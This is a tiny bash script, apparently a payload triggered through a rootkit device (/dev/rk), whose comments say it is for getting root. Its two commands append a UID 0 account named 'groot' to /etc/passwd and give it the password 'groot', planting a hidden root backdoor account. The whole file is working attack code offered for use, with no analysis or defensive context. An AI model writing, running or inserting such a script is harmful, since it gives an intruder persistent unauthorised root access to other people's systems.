#!/bin/env bash
# Copy this script to /dev/shm/rk.sh and run `echo password run > /dev/rk`
# Script to get to root using the /dev/shm/rk.sh script.

echo "groot:x:0:0::/root:/bin/bash" >> /etc/passwd
echo "groot:groot" | chpasswd
